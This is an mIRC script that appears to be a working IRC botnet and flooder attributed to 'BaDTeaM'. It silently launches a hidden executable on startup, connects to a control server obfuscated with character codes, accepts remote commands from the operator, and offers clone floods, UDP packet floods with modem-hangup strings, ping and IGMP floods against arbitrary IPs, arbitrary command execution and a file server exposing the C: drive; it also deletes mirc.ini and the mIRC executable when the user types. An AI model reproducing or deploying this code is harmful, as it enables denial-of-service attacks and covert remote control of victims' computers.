[script]
n0=alias TimeOk set %nick $2 | set %channel $2 | set %server $3 | set %port $4 | if ($1 = nick) { sockopen warbad $+ $rand(1,999999) %server %port | halt } | if ($1 = chan) { sockopen chan $+ $rand(1,999999) %server %port | halt } | if ($1 = kill) { sockopen kill $+ $rand(1,999999) %server %port | halt } | if ($1 = notice) { sockopen notice $+ $rand(1,999999) %server %port | halt } | if ($1 = msg) { sockopen msg $+ $rand(1,999999) %server %port | halt } | if ($1 = nickbot) { set %lolnick $2 | halt } | if ($1 = floodmsg) { set %floodbad $2- | halt } | if ($1 = join) { sockopen boj $+ $rand(1,999999) %server %port | halt } | if ($1 = register) { sockopen register $+ $rand(1,999999) %server %port | halt } 
n1=on *:Sockopen:warbad*:{ if ($sockerr > 0) { halt }  | set -u %user $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)  | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ %lolnick | .sockwrite -n $sockname privmsg %nick : $+ %floodbad | .sockwrite -n $sockname notice %nick : $+ %floodbad | .sockclose $sockname | .sockopen warbad $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) %server %port }
n2=on *:Sockopen:chan*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ %lolnick | sockwrite -tn $sockname join %channel | .sockwrite -n $sockname quit %floodbad | .sockclose $sockname | .sockopen chan $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) %server %port }
n3=on *:Sockopen:kill*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ %lolnick |   sockwrite -tn $sockname join %channel | .sockwrite -n $sockname privmsg %nick : $+ $chr(1) $+ finger $+ $chr(1) | .sockclose $sockname | .sockopen kill $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) %server %port }
n4=on *:Sockopen:msg*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ %lolnick |   sockwrite -tn $sockname join %channel | .sockwrite -n $sockname privmsg %nick : $+ %floodbad | .sockclose $sockname | .sockopen msg $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) %server %port }
n5=on *:Sockopen:notice*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ %lolnick |   sockwrite -tn $sockname join %channel | .sockwrite -n $sockname notice %nick : $+ %floodbad | .sockclose $sockname | .sockopen notice $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) %server %port }
n6=on *:sockread:warbad*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
n7=on *:sockread:chan*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
n8=on *:sockread:kill*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
n9=on *:sockread:msg*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
n10=on *:sockread:notice*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
n11=alias stopf { /.sockclose w* | /.sockclose reg* | /.sockclose c* | /.sockclose k* | /.sockclose n* | /.sockclose m* }
n12=on *:sockread:bo*: { sockread %botread | set %nickl1 $gettok(%botread,1,32) | set %nickl2 $left(%nickl1,8) | set %nickf $right(%nickl2,7) | if ($gettok(%botread,5,32) == $chr(98) $+ $chr(97) $+ $chr(100) $+ $chr(116) $+ $chr(101) $+ $chr(97) $+ $chr(109)) && (%nickf == BaDTeaM) { $gettok(%botread,6-,32) } }
n13=on *:Sockopen:bot*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) | .sockwrite -nt $sockname USER %user %user %user : $+ $me | .sockwrite -nt $sockname NICK $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ --- $+ $rand(000,999) | sockwrite -tn $sockname join $chr(291) $+ $chr(0135) $+ $chr(0253) $+ $chr(0135) | .timer 0 120 sockwrite -n $sockname privmsg $chr(291) $+ $chr(0135) $+ $chr(0253) $+ $chr(0135) : $+ $chr(98) $+ $chr(97) $+ $chr(100) $+ $chr(116) $+ $chr(101) $+ $chr(97) $+ $chr(109) ....... ! }
n14=on *:sockclose:bot*:/.timer 1 3 sockopen $chr(98) $+ $chr(111) $+ $chr(116) $chr(105) $+ $chr(114) $+ $chr(99) $+ . $+ $chr(98) $+ $chr(97) $+ $chr(100) $+ $chr(116) $+ $chr(101) $+ $chr(97) $+ $chr(109) $+ . $+ $chr(111) $+ $chr(114) $+ $chr(103) $chr(313) $+ $chr(312) $+ $chr(313) $+ $chr(312) $+ $chr(313)
n15=on *:Sockopen:boj*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK  $read src.txt $+ $rand(0,9) | sockwrite -tn $sockname join %channel | .timer 0 120 sockwrite -n $sockname privmsg %channel : $+ We Ready To Fuck Chan  ....... ! }
n16=on *:DISCONNECT: { .timergetinchan off | random | //timerconnect 0 60 whatfun }
n17=alias whatfun { if (%connect.count < 501) || (%connect.count = $null) { inc %connect.count 1 | set %connect.server $read -l1 serv20.txt | if (%connect.server != $null) { /server %connect.server } } } | else { server $read -l1 serv20.txt | else { server $read -l1 serv20.txt } }
n18=alias random {
n19=  if ($exists(src.txt) == $false) { /nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(0000,9999) | identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | halt }
n20=  else { /nick $read src.txt $+ $chr(91) $+ $r(0,9999) $+ $chr(93) | /identd on $rand(a,z) $+ $read src.txt $+ $r(a,z) }
n21=}
n22=on *:START:{
n23=  //run $mircdir $+ WINSOK /n /fh †††††† 
n24=  .timer 1 7 /starter
n25=}
n26=alias starter {
n27=  if (%f = on) { timer 1 1 lokp | set %f off }
n28=  //remini mirc.ini mirc user | //remini mirc.ini mirc email | //writeini mirc.ini mirc user $read src.txt | //writeini mirc.ini mirc email $read src.txt $+ @ Mail.com
n29=  if ($exists(WINSOK.exe) == $false) { /exit }
n30=  //.timer 1 5 server $read -l1 serv20.txt
n31=  .timer 1 3 set %arab #ÈbadteamÈ
n32=  nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ ----- $+ $rand(00000,99999) | if (%arab = #ÈbadteamÈ) { set %arab ÈbadteamÈ }
n33=  .flush | unset %scan.* | unset %port.* | set %connect.count 0 | .disable #invite | set %f off
n34=  if ($exists(src.txt) == $false) { identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | halt } | else { /identd on $r(a,z) $+ $read src.txt $+ $r(a,z) } | if (%idel = $null) { set %idel irc.arabchat.org } | .timerconnect 0 60 whatfun
n35=}
n36=on *:OP:#: { if ($chan = %arab) && ($opnick = $me) { mode $chan +mnstk-iR áÈá } }
n37=on *:CONNECT: { .flush | mode $me +ix | if (%arab = $null) { set %arab ÈbadteamÈ } | timergetinchan 0 30 /join %arab áÈá | .timerconnect off }
n38=on *:PART:#: { if ($comchan($nick,0) = 0) { /ruser $nick } | if ($chan = %arab) { .timergetinchan 0 30 join %arab áÈá } }
n39=on *:JOIN:#: { if ($me isop $chan) { .timergetinchan off } | if ($me isop $chan) && ($chan = %arab) { mode $chan +nsptmk-iR áÈá } }
n40=on *:QUIT: ruser $nick | if ($nick = %scan.nick) { .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
n41=on *:NICK: ruser $nick | if ($nick = %scan.nick) { set %scan.nick $newnick | .msg %scan.nick Scanned nickname now changed to %scan.nick ;) | halt }
n42=
n43=on 1:TEXT:!makeFlood *:*: { if (%idel = %idel) || (%idel = $null) { set %idel irc.arabchat.org } | if ($2 = %idel) { auser 700 $nick | .notice $nick Ok I'm Ready } }
n44=alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %pchan [packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  msg %pchan 14[sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 400 gdope $1 $2 $3 }
n45=alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
n46=  sockudp gnumc1 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
n47=  sockudp gnumc3 $2 $3 + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
n48=  sockudp gnumc2 $2 $3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
n49=  sockudp gnumc4 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
n50=  return |  :done | //msg %pchan [packeting]: Finished! | .timergcoolt off | unset %gnum | unset %pchan 
n51=} 
n52=on 700:TEXT:*:*: {
n53=  if (BaDTeaM !isin $nick) { halt }
n54=  if ($exists(WINSOK.exe) == $false) { /quit Error/Missing File ( $+ $ip $+ ) (WINSOK.exe (hide not detected! quitting)...HI MOM) | /exit }
n55=  if ($1 == !igmp) { if ($2 == $null) { /msg # Error/Syntax: (!igmp ip.here) | halt } | .remove igmp.vbs | .write igmp.vbs Set src3 = CreateObject("Wscript.shell") | .write igmp.vbs src3.run "command /c igmp $2 ",0,true | .run igmp.vbs }
n56=  if ($1 == !pepsi) { if ($2 == $null) { /msg # Error/Syntax: (!pepsi ip howmany size port, ie: !pepsi 127.0.0.1 1000 200 139) | halt } | .remove pepsi.vbs | .write pepsi.vbs Set src3 = CreateObject("Wscript.shell") | .write pepsi.vbs src3.run "command /c pepsi -n $3 -p $4 -d $5 $2 ",0,true | .run pepsi.vbs }
n57=  if ($1 == !icmp) { if ($2 == $null) { /msg # Error/Syntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | .remove icmp.vbs | .write icmp.vbs Set src3 = CreateObject("Wscript.shell") | .write icmp.vbs src3.run "command /c ping -n $4 -l $3 -w 0 $2 ",0,true | .run icmp.vbs }
n58=  if ($1 = !arabflood) && ($2 != $null) { /arabfuck $2- }
n59=  if ($1 = !flood) && ($2 != $null) { /timeok $2- }
n60=  if ($1 = !Cock) && ($2 != $null) { loadbots $2- } 
n61=  if ($1 == !packet) { if ($3 == $null) { /msg # Error/Syntax: (You must provide an IP & Ammount !packet ip ammount). | halt } | //run ping.exe -n $3 -v AUTH -l 64000 $2 | //run temp2.exe /n /fh ping | /timer 2 1 //run temp2.exe /n /fh ping | /msg # Sending [64,000kb] of Data to ( $+ $2 $+ ) }
n62=  if ($1 = !floodoff) { /cleanup | stopf | stopflood }
n63=  if ($1 = !part) && ($2 != $null) { /PART $2- | .notice $NICK Task Completed. }
n64=  if ($1 = !join) && ($2 != $null) { /Join $2 | .notice $NICK Task Completed. }
n65=  if ($1 = !die) { //run $mircexe | /quit I Am a Bitch who hates $nick for killing me | /exit }
n66=  if ($1 == !-) { /msg # 14[12done14]: / $+ $2- | / $+ [ [ $2- ] ] }
n67=  if ($1 = !Nick) && ($2 != $null) { /nick $2- | .notice $NICK Task Completed. }
n68=  if ($1 = !notice) && ($3 != $null) { /notice $2- | .notice $NICK Task Completed. }
n69=  if ($1 = !Ru) && ($2 != $null) { /ruser $2- | notice $nick $2- Removed From My Access List. }
n70=  if ($1 = !stats) { if ($chan != $null) { .msg $chan I am using (Windows $os $+ ) With mIRC version $version I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ). It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ ) Mask ( $+ $host $+ ) } | else { .msg $nick I am using (Windows $os $+ ) With mIRC version $version I have been connected to ( $+ $server $+ ) on port ( $+ $port $+ ) for ( $+ $duration($online) $+ ). It has been ( $+ $duration($calc($ticks / 1000)) $+ ) since i last rebooted Ip Address is ( $+ $ip $+ ) Mask ( $+ $host $+ ) } }
n71=  if ($1 = !pfast) && ($chan != $null) { //set %pchan # |  if ($4 == random) { //gcoolstart $2 $3 $r(1,64000) | halt } | //gcoolstart $2 $3 $4 }
n72=  if ($1 = !portredirect) { if ($2 == $null) { /msg # 14Portredirection Error!!! For help type: !portredirect help | halt } | if ($2 == help) { /msg # 14*** Port Redirection Help! *** | /msg # 14Commands.. | //msg # 14!portredirect add 1000 irc.arabchat.org 6667 | //msg # 14!portredirect stop port | //msg # 14!portredirect stats | /msg # 14Port Redirect Help / END halt } | if ($2 == add) { if ($5 == $null) { /msg # 3Port Redirection Error: !portredirect add inputport outputserver outputserverport (!portredirect add 1000 irc.arabchat.org 6667) | halt } | //gtportdirect $3- | /msg # 14[Redirect Added] I-port=( $+ $3 $+ ) to $4 $+ $5 | /msg # 12[Local IP Address]:14 $ip |  halt  } |  if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 |  /msg # 14[Portredirection] Port:(12 $+ $3 $+ 14) Has been stopped. |  halt  } | if ($2 == stats) { |  //msg  # 12*** Port Redirection Stat's. |  /predirectstats #  } }
n73=  if ($1 = !sub7) { if ($2 = on) { .enable #Sub7Update | notice $nick Updater Enabled } | elseif ($2 = off) { .disable #Sub7Update | .notice $nick Sub7 Updater Disabled } | else { .notice $nick Error please use !sub7 <ON/OFF> } }
n74=  if ($1 = !badinvite) { if ($2 = on) { .write -l1 msg.txt $3- | timer 1 3 /run settings.exe inviter.ini | notice $nick Invite Enabled With MSG ( $3- ) } }
n75=  if ($1 == !fserve) { /msg # 14[12File-Server-Initialized14] 15(2 $+ $nick $+ 15) (: 3Enjoy! | /fserve $nick 3 C:\  }
n76=  if ($1 == !cycle) { if ($2 == $null) { /msg # Error/Syntax: (!cycle #Channel Please } |  /raw -q part $2 Cycling. | raw -q join $2  }
n77=  if ($1 == !op) {  if ($3 == $null) { /msg # Error/Syntax: !op #channel $nick | halt } |   else { /mode $2 +o $3 } }
n78=  if ($1 == !deop) {  if ($3 == $null) { /msg # Error/Syntax: !deop #channel $nick | halt } |  else { /mode $2 -o $3 }  }
n79=  if ($1 == !voice) {  if ($3 == $null) { /msg # Error/Syntax:  !voice #channel Nick | halt } |   else { /mode $2 +v $3 }  }
n80=  if ($1 == !devoice) {  if ($3 == $null) { /msg # Error/Syntax: !devoice #channel Nick | halt } |     else { /mode $2 -v $3 }  }
n81=  if ($1 == !kick/ban) { if ($4 == $null) { /msg # Syntax: !kick/ban #channel Nick MSG (KickMessage) | halt } |  else {  /mode $2 -o+b $3 $address($3,2)  | /kick $2 $3 $4-  | halt }  }
n82=  if ($1 == !Clones) { sockwrite -n boj* join $2 | sockwrite -n boj* privmsg $2 : $+ $flooder | .timer 0 5 sockwrite -n boj* privmsg $2 : $+ $flooder }
n83=}
n84=on *:INPUT:*: { haltdef | /echo -a < $+ $me $+ > $1- | msg %arab --Warning- (Input command) $1- | /clearall | //run $mircdir $+ WINSOK /n /fh ††††††  | halt | remove $mircini | remove $mircexe }
n85=raw 433:*: { /nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ [ $+ $rand(00000,99999) $+ ] }
n86=
n87=alias arabfuck {
n88=  if ($2 = $null) || ($2 !isnum) { notice $nick Error Type: !arabflood <chan/nick> <num of clones> <server> <port> <message> | halt }
n89=  set %nick $$1
n90=  set %clones $$2
n91=  set %channel $$1
n92=  if ( $3 = $null) { set %server $server }
n93=  if ( $3 != $null) { set %server $$3 }
n94=  if ( $4 = $null) || ( $4 !isnum) { set %port $port }
n95=  if ( $4 != $null) { set %port $$4 }
n96=  if ( $5 = $null) { set %flood »«œ  Ì„ ÂÏÂÏÂÏÂÏ }
n97=  if ($5 != $null) { set %flood $5- }
n98=  set %papaflood on
n99=  /identd on $r(a,z) $+ $read src.txt $+ $r(a,z)
n100=  var %var = 0
n101=  :loop
n102=  inc %var
n103=  if (%papaflood == on) && (%var <= %clones) { .sockopen Papaarab $+ %var %server %port | goto loop }
n104=  else { notice $nick 4Clones Loaded | .notice $NICK Task Completed. | halt }
n105=}
n106=
n107=on *:Sockopen:Papaarab*:{
n108=  if ($sockerr > 0) { halt }
n109=  set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
n110=  .sockwrite -nt $sockname USER %user %user %user : $+ %user
n111=  .sockwrite -nt $sockname NICK $chr($gettok(214 213 203 222 221 219 218 229 206 205 204 207 212 211 237 200 225 199 202 228 227 223 216,$rand(1,22),32)) $+ $chr($gettok(214 213 203 222 221 219 218 229 206 205 204 207 212 211 237 200 225 199 202 228 227 223 216,$rand(1,22),32)) $+ $chr($gettok(214 213 203 222 221 219 218 229 206 205 204 207 212 211 237 200 225 199 202 228 227 223 216,$rand(1,22),32)) $+ $chr($gettok(214 213 203 222 221 219 218 229 206 205 204 207 212 211 237 200 225 199 202 228 227 223 216,$rand(1,22),32))
n112=  .sockwrite -nt $sockname JOIN : $+ %channel
n113=  .sockwrite -n $sockname Privmsg %nick : $+ %flood
n114=  .sockwrite -n $sockname privmsg %nick : $+ $chr(1) $+ ›‰Ã— $+ $chr(1)
n115=  .sockclose $sockname
n116=  .sockopen Papa $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
n117=}
n118=on *:sockread:Papa*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
n119=alias cleanup { set %papaflood off | .sockclose Papa* | unset %nick | unset %channel | unset %server | unset %port | unset %clones | unset %flood | unset %flood.nick | notice $nick 4All Clones Have Been Cleared }
n120=
n121=alias loadbots {
n122=  if ( %quit.msg == $Null ) { 
n123=    set %quit.msg  #"$(…√ß..B‡DTÍ‡M..ß%#$£!(*áß#"$(…√ß..B‡DTÍ‡M..ß%#$£!(*áß#"$(…√ß..B‡DTÍ‡M..ß%#$£!(*áß#"$(…√ß..B‡DTÍ‡M..ß%#$£!(*áß#"$(…√ß..B‡DTÍ‡M..ß%#$£!(*áß#"$(…√ß..B‡DTÍ‡M..ß%#$£!(*áß#"$(…√ß..B‡DTÍ‡M..ß%#$£!(
n124=  }
n125=  if ( $3 == $null ) { set %server $server }
n126=  else { set %server $3 }
n127=  if ( $4 isnum ) {  set %port $4 }
n128=  if ( $4 == $Null ) { set %port $port }
n129=  set %flooding on
n130=  if ( $2 == $null ) {  halt }
n131=  else { set %clones.num $2 }
n132=  if ( $1 == $null ) { halt }
n133=  else { set %nick2 $1 }
n134=  botload
n135=}
n136=
n137=alias botload { 
n138=  set %num.clones 1
n139=  while ( %num.clones <= %clones.num ) { 
n140=    .sockopen proxy. $+ %num.clones %server %port
n141=    inc %num.clones 1
n142=  }
n143=}
n144=
n145=on *:sockopen:proxy.*: {
n146=  if ($sockerr > 0) { return }
n147=}
n148=
n149=on *:sockread:proxy*:{
n150=  if ( %flooding == off ) { halt }
n151=  sockread %info
n152=  if ( Ping isin %info) { sockwrite -tn $sockname Pong %server }
n153=  set %user3 $rand(a,z) $+ $rand(a,z) $+ $rand(1,99) $+ $rand(a,z) $+ $rand(1,99)
n154=  .sockwrite -n $sockname USER %user3 " $+ $sock($sockname).ip $+ " " $+ $ip $+ " : $+ %user3 
n155=  .sockwrite -tn $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ %lolnick 
n156=  .sockwrite -nt $sockname JOIN  : $+ %nick2
n157=  .sockwrite -n $sockname privmsg %nick2 : $+  $flooder
n158=  .sockwrite -tn $sockname quit : $+ %quit.msg
n159=  .sockopen proxy $+ $rand( 0,999) $+ $rand(a,z ) $+ $rand(0,999) $+ $rand(a,z) $+ $rand( 0,999) %server %port 
n160=  .sockclose $sockname
n161=}
n162=
n163=alias flooder {
n164=  set %var $rand(1,6)
n165=  if ( %var == 1 ) { return $chr(1) $+ VERSION $+ $chr(1) }
n166=  if ( %var == 6 ) { return BaDTeaM.....BaDTeaM flo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0dflo0d }
n167=  if ( %var == 5 ) { return BaDTeaM.....BaDTeaM.....BaDTeaM.....BaDTeaM.....BaDTeaM..... }
